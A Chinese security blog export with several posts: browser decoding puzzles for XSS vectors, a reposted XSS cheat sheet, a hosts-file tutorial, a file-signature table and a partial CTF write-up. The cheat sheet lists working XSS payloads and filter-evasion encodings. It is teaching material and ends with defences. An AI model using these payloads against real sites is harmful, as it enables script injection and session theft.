同样还是不会被执行，原因还是因为解码字符实体状态机不会进入标签打开状态（TagOpen State），因此里面的 &lt;script&gt; 并不会被解析为 HTML 标签。 0x06 1&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; 不能弹窗。和 0x05 的解释差不多，在 RCDATA元素内，字符实体状态机不会进入标签打开状态（TagOpen State），因此里面的 &lt;script&gt; 并不会被解析为 HTML 标签。所以不会弹窗。 0x07 1&lt;button onclick="confirm('7&amp;#39;);"&gt;Button&lt;/button 因为 confirm alert prompt 函数的功能都有弹出窗口的作用，&amp;#39 在 HTML 解析阶段被编码为&#39;，所以能成功执行。 0x08 1&lt;button onclick="confirm('8\u0027);"&gt;Button&lt;/button&gt; 这道题和上一道题相似，但只不过是实体编码换成了 unicode 编码，因为 js 解码 Unicode 之后得到的结果知识字符，而 &#39; 又是一个控制字符，但是不会被当作控制字符，所以不会被成功执行。 0x09 1&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;&lt;/script&gt; 不能弹窗。因为在原始文本元素（&lt;script&gt; 和 &lt;style&gt;）类型标签下的所有字符实体编码都不会被 HTML 解码。因此上述语句不会被解码。 0x0A- 1&lt;svg&gt;&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;&lt;/script&gt;&lt;/svg&gt; 能弹窗。[0x08] &amp; [0x09] 分析一：因为 &lt;svg&gt; 属于 XML 元素，不是 HTML 标签，因为下 xml 支持在标签内解析HTML实体字符，所以实体编码在 XML 中会被解析，并被执行。在 XML 中实体会自动转义，除了&lt;![CDATA[和]]&gt;包含的实体。 分析二：待续 0x0A 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt; 能弹窗。因为Unicode 序列不能出现在控制字符中，否则不能被解释。而 \u0061\u006c\u0065\u0072\u0074 中没有控制符，将 Unicode 解码后成为 alert ，它只是标识符 0x0B 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt; 不会弹窗。javascript解码器会将 \u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029 解码为 alert(1)，该结果中的控制字符( 和 ) 被编码了，所以不能被正常解释。 0x0C 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt; 不能弹窗。被编码部分为 alert 及括号内为12。原因在于括号内被编码的部分不能被正常解释，即使反编码之后为数字，但是仍然按照字符串来处理（这里的12为字符串12，并不是int整数）。要么使用 ASCII 数字，要么加” “或’ ‘使其变为字符串，作为字符串也只能作为普通字符。 0x0D 1&lt;script&gt;alert('13\u0027)&lt;/script&gt; 不能被执行。\u0027 被编码为 &#39; ，该符号属于控制字符，所以这里控制字符被编码了，解码后的 &#39; 将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有 &#39; 来结束字符串。 0x0E 1&lt;script&gt;alert('14\u000a')&lt;/script&gt; 能被成功执行。和 0x0D 进行对比可知，这里有 &#39; 符号作为控制字符来结束字符串，所以能够被执行。 0x0F 1&lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"&gt;&lt;/a&gt; 能被执行。分析过程如下： 步骤 ① ：首先是HTML 解析，将 &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29; 解码为 javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15) 步骤 ② ：因为 href 属性，因为存在着 javascript: 伪协议，所以紧接着进行 URL 解析，将 javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15) 解析为 javascript:\u0061\u006c\u0065\u0072\u0074(15) 步骤 ③：最后通过 javascript 解析器 将 javascript:\u0061\u006c\u0065\u0072\u0074(15) 解码为 javascript:alert(15) ，所以最终得到的结果是 &lt;a href=javascript:alert(15)&gt;&lt;/a&gt;，在Unicode 解码过程中，并没有控制字符被编码，所以 javascript:alert(15) 能成功地被执行。 四、参考文献0x01 深入理解浏览器解析机制和XSS向量编码：http://bobao.360.cn/learning/detail/292.html 0x02 浏览器渲染原理与编码解码：https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8 0x03 浏览器编码题目：http://test.attacker-domain.com/browserparsing/answers.txt 0x04 一次对浏览器解析和XSS的深度探究：https://www.freebuf.com/articles/web/222849.html 0x05 深入探究浏览器编码及XSS Bypass：https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA 0x06 XSS与字符编码及浏览器解析原理：http://www.lin2zhen.top/index.php/archives/16/ 0x07 HTML5/syntax：https://www.w3.org/html/ig/zh/wiki/HTML5/syntax 0x08 SVG XSS的一个黑魔法：https://www.hackersb.cn/hacker/85.html 0x09 图片XSS小结：https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】 XSS 简单总结]]></title>
    <url>%2F2020%2F02%2F23%2F2020.02.23%EF%BC%8894%EF%BC%89%2F</url>
    <content type="text"><![CDATA[简述XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 常用的XSS攻击手段和目的123451.盗用cookie，获取敏感信息。2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。 分类反射型12反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 存储型12持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 DOM型1传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 无任何过滤情况下一些常见标签PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。= script 1&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt; img 1&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; input 12345&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;竞争焦点，从而触发onblur事件&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt; details 123&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt; svg 1&lt;svg onload=alert(&quot;xss&quot;);&gt; select 123&lt;select onfocus=alert(1)&gt;&lt;/select&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt; iframe 1&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt; video 1&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; audio 1&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt; body 1&lt;body/onload=alert(&quot;xss&quot;);&gt; 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发 12&lt;bodyonscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; textarea 1&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt; keygen 1&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐 marquee 1&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以 isindex 1&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE 利用link远程包含js文件PS：在无CSP的情况下才可以 1&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt; javascript伪协议&lt;a&gt;标签 1&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt; &lt;iframe&gt;标签 1&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt; &lt;img&gt;标签 1&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//IE7以下 &lt;form&gt;标签 1&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; 其它expression属性 123&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;&apos;))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&apos;&apos;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下 background属性 1&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效 有过滤的情况下过滤空格用/代替空格 1&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt; 过滤关键字大小写绕过1&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt; 双写关键字有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过 1&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt; 字符拼接利用eval 1&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt; 利用top 1&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt; 其它字符混淆有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了下面举几个简单的例子 1234可利用注释、标签的优先级等1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt; 编码绕过Unicode编码绕过 123&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt; url编码绕过 1&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt; 1&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt; Ascii码绕过 1&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt; hex绕过 1&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt; 八进制 1&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt; base64绕过 1&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt; 1&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; 过滤双引号，单引号1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号 1&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt; 2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了 过滤括号当括号被过滤的时候可以使用throw来绕过 1&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt; 过滤url地址使用url编码1&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt; 使用IP1.十进制IP 1&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt; 2.八进制IP 1&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt; 3.hex 1&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt; 4.html标签中用//可以代替http:// 1&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt; 5.使用\\ 1但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议 Windows下 Linux下6.使用中文逗号代替英文逗号如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号 1&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度 如何防止xss 过滤一些危险字符，以及转义&amp; &lt; &gt; &quot; &#39; /等危险字符 HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。 设置CSP(Content Security Policy) 输入内容长度限制 后记感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正 Referencehttps://html5sec.org/很全的xss总结https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></content>
      <tags>
        <tag>web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】文件 HOSTS 的简介和修改方法]]></title>
    <url>%2F2020%2F02%2F23%2F2020.02.23%EF%BC%8893%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、什么是 hostshosts —— the static table lookup for host name（主机名查询静态表）。 hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。 Hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 优先级 ： dns缓存 &gt; hosts &gt; dns服务 二、hosts的位置hosts在各个系统中所在的文件夹： Windows 系统hosts位于 C:\Windows\System32\drivers\etc\hosts Android（安卓）系统hosts位于 /etc/hosts Mac（苹果电脑）系统hosts位于 /etc/hosts iPhone（iOS）系统hosts位于 /etc/hosts Linux系统hosts位于 /etc/hosts 绝大多数Unix系统都是在 /etc/hosts 三、hosts的内容Windows版本的hosts文件内容如下： 1234567891011121314151617181920# Copyright (c) 1993-2009 Microsoft Corp.# # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space.# # Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a &apos;#&apos; symbol.# # For example:## 102.54.94.97 rhino.acme.com # source server# 38.25.63.10 x.acme.com # x client host# localhost name resolution is handled within DNS itself.# 127.0.0.1 localhost# ::1 localhost复制代码 #后都是注释，所以清空hosts文件对系统正常运行并没有什么影响。 在一个局域网中，每台机器都有一个主机名，用于区分主机，便于相互访问。 一般/etc/hosts的内容一般有如下类似内容： 127.0.0.1 localhost.localdomain localhost 192.168.1.100 linumu100.com linumu100 192.168.1.120 ftpserver ftp120 一般情况下hosts文件的每行尾一个主机，每行由三部分组成，每个部分由空格隔开。 第一部分：网络IP地址； 第二部分：主机名或域名； 第三部分：主机名别名； 当然每行也可以是两部分，即主机IP地址和主机名。 主机名（hostname)和域名（domain)的区别： 主机名通常在局域网内使用，通过hosts文件，主机名就被解析到对应IP; 域名通常在INTERNET上使用，但如果本机不想使用internet上的域名解析，这时就可以更改hosts文件，加入自己的域名解析。 四、hosts的作用1、加快域名解析 对于要经常访问的网站，我们可以通过在Hosts中配置域名和IP的映射关系，提高域名解析速度。由于有了映射关系，当我们输入域名计算机就能很快解析出IP，而不用请求网络上的DNS服务器。 2、方便局域网用户 在很多单位的局域网中，会有服务器提供给用户使用。但由于局域网中一般很少架设DNS服务器，访问这些服务器时，要输入难记的IP地址。这对不少人来说相当麻烦。可以分别给这些服务器取个容易记住的名字，然后在Hosts中建立IP映射，这样以后访问的时候，只要输入这个服务器的名字就行了。 3、屏蔽网站（域名重定向） 有很多网站不经过用户同意就将各种各样的插件安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的域名映射到错误的IP或本地计算机的IP，这样就不用访问了。 4、顺利连接系统 对于Lotus的服务器和一些数据库服务器，在访问时如果直接输入IP地址那是不能访问的，只能输入服务器名才能访问。那么我们配置好Hosts文件，这样输入服务器名就能顺利连接了。 5.虚拟域名 很多时候，网站建设者需要把”软环境“搭建好，再进行上传调试。但类似于邮件服务，则需要使用域名来辅助调试，这时就可以将本地 IP 地址与一个”虚拟域名“做地址指向，就可以达到要求的效果，且无需花费。如： 127.0.0.1 网站域名 之后在浏览器地址栏中输入对应的网站域名即可。 五、如何修改hosts1、屏蔽网站（域名重定向）在WINDOWS系统中，约定 127.0.0.1 为本地计算机的IP地址, 0.0.0.0是错误的IP地址。 如果，我们在hosts中，写入以下内容： 127.0.0.1 要屏蔽的网站A的域名 0.0.0.0 要屏蔽的网站B的域名 这样，计算机解析域名A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。 在修改hosts文件时候，还常常遇到修改保存后无效的情况，这里要提醒大家注意的一点：很多人是写在最后行，写完最后一行后在没有回车的情况下，这一行是不生效的。一定要记得回车。建议大家遵循这样的习惯：“ip地址+Tab+域名+换行” 添加记录。 2、局域网用户访问如果，我们在A主机的hosts中，写入以下内容： B主机的ip B主机名 这样我们就可以通过B主机名找到B主机及其服务。 3、android系统的hosts修改在 Android 下，/etc 是 link 到 /system/etc 的，我们需要修改 /system/etc/hosts 来实现。但是这个文件是只读，不能通过 shell 直接修改。可以通过连接到 PC 上使用 adb 来修改。步骤如下： （1）获得root权限：adb root （2）设置/system为可读写：adb remount （3）将hosts文件复制到PC：adb pull /system/etc/hosts （4）修改PC机上文件 （5）将PC机上文件复制到手机：adb push /system/etc/hosts 如果要查看是否修改成功，可以在PC上执行adb shell，运行cat /system/etc/hosts;或者在手机上运行cat /system/etc/hosts。 在Android系统中，hosts文件格式有一点与PC机Linux不同：不能在一行中一个IP对应多个域名，比如： 127.0.0.1 host1.example.com host2.example.com host3.example.com 在大多PC机Linux系统是合法的，但不能在Android上起作用，需要拆成每个域名一行才能使用： x.x.x.x host1.example.com x.x.x.x host2.example.com x.x.x.x host3.example.com 4、通过修改hosts上google第一步：下载可以正常使用的hosts文件 可以在百度搜索类似“Google hosts”等相关关键词或者老D，找到最新可用的host文件。 第二步：修改本地hosts文件 在电脑系统中找到hosts，路径基本上是C:\Windows\System32\drivers\etc，然后将下载的hosts文件将本地hosts文件替换，或者在本地hosts文件中直接在地址栏修改即可！ 第三步：刷新本地dns 第二步完成本地hosts文件的修改之后，可以使用dos命令完成最后的操作。 （1）使用WIN+R键，启动运行，键入cmd （2）在dos界面输入“ipcong /flushdns” （3）dos命令窗提示“已成功刷新DNS解析缓存”，就完成了。 六、其他1、怎么获取域名所对应的IP地址打开“开始――运行”，输入“cmd”，在命令行界面输入“ping www.baidu.com”，回车。 显示结果类似：Reply from 220.181.6.18:bytes=32 time=24msTTL=55。 其中的220.181.6.18就是域名所对应IP地址（百度的）。呵呵！ 2、修改hosts后生效方法（1）Windows 开始 -&gt; 运行 -&gt; 输入cmd -&gt; 在CMD窗口输入 ipconfig /flushdns （2）Linux 打开终端 重启网络： sudo /etc/init.d/networking restart desktop版可以这样重启： sudo service network-manager restart 如果只是修改了某个网卡(例如eth0)的信息，也可以通过重启网卡的方式使其修改生效。 sudo ifdown eth0 sudo ifup eth0 如果不懂请都尝试下 （3）Mac OS X终端输入 sudo killall -HUP mDNSResponder （4）Android 开启飞行模式 -&gt; 关闭飞行模式 （5）通用方法 拔网线(断网) -&gt; 插网线(重新连接网络) 如不行请清空浏览器缓存（建议不要使用国产浏览器，请使用谷歌Chrome浏览器）]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各种文件的文件头和文件尾总结]]></title>
    <url>%2F2020%2F02%2F09%2F2020.02.09%EF%BC%8892%EF%BC%89%2F</url>
    <content type="text"><![CDATA[文件类型 文件头 文件尾 JPEG FFD8FF FF D9 PNG (png) 89504E47 AE 42 60 82 GIF (gif) 47494638 00 3B ZIP Archive (zip) 504B0304 50 4B TIFF (tif) 49492A00 —— Windows Bitmap (bmp) 424D —— CAD (dwg) 41433130 —— Adobe Photoshop (psd) 38425053 —— Rich Text Format (rtf) 7B5C727466 —— XML (xml) 3C3F786D6C —— HTML (html) 68746D6C3E —— Winhex：3C 21 44 4F 43 54 59 50 45 20 68 74 6D 6C 3E Email [thorough only] (eml) 44656C69766572792D646174653A —— Outlook Express (dbx) CFAD12FEC5FD746F —— Outlook (pst) 2142444E —— MS Word/Excel (xls.or.doc) D0CF11E0 —— MS Access (mdb) 5374616E64617264204A —— WordPerfect (wpd) FF575043 —— Adobe Acrobat (pdf) 255044462D312E —— Quicken (qdf) AC9EBD8F —— Windows Password (pwl) E3828596 —— RAR Archive (rar) 52617221 —— Wave (wav) 57415645 —— AVI (avi) 41564920 —— Real Audio (ram) 2E7261FD —— Real Media (rm) 2E524D46 —— Quicktime (mov) 6D6F6F76 —— Windows Media (asf) 3026B2758E66CF11 —— MIDI (mid) 4D546864 —— 附件：文件格式分析器]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【WP】XCFT misc新手阶段]]></title>
    <url>%2F2020%2F01%2F30%2F2020.01.30%EF%BC%8891%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、PDF1.基础知识 无 2.题目要求 3.做题步骤 直接 pdf 转换为 word （转换工具点击这里），然后将 word 中的图片进行移动，会发现图片下的 flag。 二、如来十三掌1.基础知识 与佛论禅算法的原理和本质 ROT-13 加密解密：其本质就是凯撒密码的密钥为 13 （平移13个字符） 2.题目要求 3.做题步骤 下载附件，得到一个 word 文件，打开该文档，发现里面的内容如下： 将文字放到“与佛论禅”破解网站里面进行翻译，如下图： 根据题目“如来十三掌”的题目提示，我们用 rot-13 进行解密，脚本代码如下： 运行脚本，得到对应的密文： 但是我们从得到的结果中不能得到什么结果，查了查，发现还要经过 base64 解码后才能得到 flag： 三、give you flag1.基础知识 二维码的原理 http://blog.sae.sina.com.cn/archives/1139 https://blog.csdn.net/weiwei9363/article/details/81112795 https://blog.csdn.net/u012611878/article/details/53167009 2.题目要求 3.做题步骤 下载并打开附件，发现是一张格式为 gif 的图片，在图片最后会看到一个类似于二维码的图片，但是出现的时间太短了，无法截图 那怎么办呢？一个字，“干”就完事了！写脚本，将这个 gif 动图一帧一帧的分离出来，说写咱就写！ 运行脚本就能得到 gif 每一帧的图片，其中红框标的的图片（名字为 49.jpg）的就是我们要得到的图片 打开图片后，发现这并不是一个完整的二维码，那么这里就需要“基础知识”中所给连接的知识了。在查过相关资料后，发现得到的“残二维码”缺少三个定位图形，下面用 PS 将这三个定位图形加上，得到如下的图片： 打开微信扫描二维码，得到 